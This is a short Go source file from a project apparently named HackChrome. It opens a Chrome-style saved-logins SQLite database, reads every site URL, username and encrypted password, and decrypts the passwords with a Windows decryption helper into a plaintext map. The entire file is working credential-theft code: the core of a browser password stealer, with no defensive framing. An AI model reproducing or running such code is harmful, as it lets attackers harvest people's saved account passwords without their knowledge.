package core

import (
	"HackChrome/utils"
	"database/sql"
	"fmt"
)

func GetPwdPre(pwdDb string) (result map[string]map[string]string) {
	result = make(map[string]map[string]string)
	db, err := sql.Open("sqlite3", pwdDb)
	if err != nil {
		fmt.Println(err)
	}
	defer func(db *sql.DB) {
		_ = db.Close()
	}(db)
	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if rows == nil || err != nil {
		fmt.Println("not found any data.", err)
		return
	}
	for rows.Next() {
		var url string
		var username string
		var pwd []byte
		_ = rows.Scan(&url, &username, &pwd)
		pwd, err = utils.WinDecrypt(pwd)
		if err != nil {
			continue
		}
		if len(url) > 0 {
			result[url] = map[string]string{"username": username, "password": string(pwd)}
		}
	}

	return
}
